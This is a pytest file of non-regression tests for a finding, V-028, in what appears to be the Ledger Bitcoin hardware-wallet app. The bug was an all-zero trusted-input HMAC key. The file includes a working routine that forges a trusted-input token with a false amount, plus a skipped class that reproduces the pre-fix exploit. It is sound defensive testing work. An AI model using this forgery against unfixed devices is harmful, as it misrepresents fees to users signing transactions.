"""Non-regression tests for Cerberus V-028.

The trusted-input HMAC key used to be 32 zero bytes, so any host could mint a
token carrying a false input amount. The device authenticated it and computed
the displayed fee from the forged value.

TestTrustedInputKey covers the fixed behaviour. TestTrustedInputKeyVulnerable
is the pre-fix behaviour, kept skipped so the finding stays reproducible on an
unfixed build: unskip it there and both tests should pass.
"""
import hmac
import struct
import time
from hashlib import sha256
from pathlib import Path

import pytest
import requests

from ledger_bitcoin.btchip.bitcoinTransaction import bitcoinTransaction
from ledger_bitcoin.psbt import PSBT

from ragger_bitcoin import RaggerClient

tests_root: Path = Path(__file__).parent

ZERO_KEY = bytes(32)

TRUSTED_INPUT_SIZE = 48           # lib-app-bitcoin/transaction.h
TRUSTED_INPUT_TOTAL_SIZE = 56     # body + 8-byte truncated HMAC
AMOUNT_OFFSET = 40                # bytes 40..47 of the body, little-endian

# pkh-1to1.psbt spends output 1 of its non-witness UTXO, which holds 1000000 sats.
REAL_AMOUNT = 1000000
FORGED_AMOUNT = 10000

CLA = 0xE0
INS_HASH_INPUT_START = 0x44


def zero_key_tag(body: bytes) -> bytes:
    """The 8-byte tag the app accepted while trustedinput_key was all zero."""
    return hmac.new(ZERO_KEY, body, sha256).digest()[:8]


def prevout_of(psbt_name: str):
    """Returns the prevout transaction, its output index, and the spend's version."""
    psbt = PSBT()
    psbt.deserialize(open(f"{tests_root}/psbt/singlesig/{psbt_name}", "r").read())
    prevtx = bitcoinTransaction(psbt.inputs[0].non_witness_utxo.serialize())
    return prevtx, psbt.tx.vin[0].prevout.n, psbt.tx.nVersion


def forge_amount(body: bytes, amount: int) -> bytes:
    """A 56-byte token over a real outpoint, sealed with the old zero key."""
    forged = (body[:AMOUNT_OFFSET]
              + struct.pack("<Q", amount)
              + body[AMOUNT_OFFSET + 8:])
    return forged + zero_key_tag(forged)


def wait_until_refused(backend, timeout: float = 10.0):
    """Waits for the app to die on the trusted-input check.

    LEDGER_ASSERT ends the app either way, but how that surfaces depends on the
    display: with one the SDK paints an "App error" screen and waits for a tap,
    headless it exits immediately and takes the Speculos API with it. CI runs
    headless, so both have to count.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            if backend.compare_screen_with_text("App error"):
                assert backend.compare_screen_with_text("Transaction parse - fail"), (
                    "app died, but not on the trusted-input HMAC check"
                )
                return
        except (OSError, requests.exceptions.RequestException):
            return  # API gone: the app exited before we could look
        time.sleep(0.2)
    raise AssertionError("token was accepted: the app neither asserted nor exited")


def start_transaction(client: RaggerClient, token, expect_refusal: bool):
    """Feeds a token to HASH_INPUT_START.

    A refused token never answers its APDU, so that chunk is fired without
    waiting for a reply that will not come.
    """
    _, _, version = prevout_of("pkh-1to1.psbt")
    backend = client.app.dongle.transport_client

    header = struct.pack("<I", version) + b"\x01"
    backend.exchange_raw(
        bytes([CLA, INS_HASH_INPUT_START, 0x00, 0x00, len(header)]) + header)

    payload = (bytes([0x01, TRUSTED_INPUT_TOTAL_SIZE])
               + bytes(token)
               + b"\x00")  # empty input script
    apdu = bytes([CLA, INS_HASH_INPUT_START, 0x80, 0x00, len(payload)]) + payload

    if not expect_refusal:
        backend.exchange_raw(apdu)
        return

    backend.send_raw(apdu)
    wait_until_refused(backend)


class TestTrustedInputKey:
    """Fixed behaviour: the key is secret, so tokens cannot be minted."""

    def test_key_is_not_zero(self, client: RaggerClient):
        """The device's tag must not be reproducible under a zero key."""
        prevtx, index, _ = prevout_of("pkh-1to1.psbt")

        token = bytes(client.app.getTrustedInput(prevtx, index)["value"])
        assert len(token) == TRUSTED_INPUT_TOTAL_SIZE

        body, tag = token[:TRUSTED_INPUT_SIZE], token[TRUSTED_INPUT_SIZE:]

        assert body[0] == 0x32, "not a trusted-input token"
        amount = struct.unpack("<Q", body[AMOUNT_OFFSET:AMOUNT_OFFSET + 8])[0]
        assert amount == REAL_AMOUNT, f"unexpected prevout amount {amount}"

        assert tag != zero_key_tag(body), "trusted input key is still all zero"

    def test_honest_token_is_accepted(self, client: RaggerClient):
        """Control: binding the amount must not ban the legal path."""
        prevtx, index, _ = prevout_of("pkh-1to1.psbt")

        token = client.app.getTrustedInput(prevtx, index)["value"]
        start_transaction(client, token, expect_refusal=False)

    def test_forged_amount_is_rejected(self, client: RaggerClient):
        """The finding itself, inverted. Last in its class: the app exits."""
        prevtx, index, _ = prevout_of("pkh-1to1.psbt")

        token = bytes(client.app.getTrustedInput(prevtx, index)["value"])
        forged = forge_amount(token[:TRUSTED_INPUT_SIZE], FORGED_AMOUNT)

        assert forged != token, "forged token must differ from the issued one"
        start_transaction(client, forged, expect_refusal=True)


@pytest.mark.skip(reason="V-028 pre-fix behaviour; unskip on an unfixed build")
class TestTrustedInputKeyVulnerable:
    """What the finding looked like. Both of these passed before the fix."""

    def test_key_is_all_zero(self, client: RaggerClient):
        prevtx, index, _ = prevout_of("pkh-1to1.psbt")

        token = bytes(client.app.getTrustedInput(prevtx, index)["value"])
        body, tag = token[:TRUSTED_INPUT_SIZE], token[TRUSTED_INPUT_SIZE:]

        assert tag == zero_key_tag(body)

    def test_forged_amount_is_accepted(self, client: RaggerClient):
        prevtx, index, _ = prevout_of("pkh-1to1.psbt")

        token = bytes(client.app.getTrustedInput(prevtx, index)["value"])
        forged = forge_amount(token[:TRUSTED_INPUT_SIZE], FORGED_AMOUNT)

        start_transaction(client, forged, expect_refusal=False)
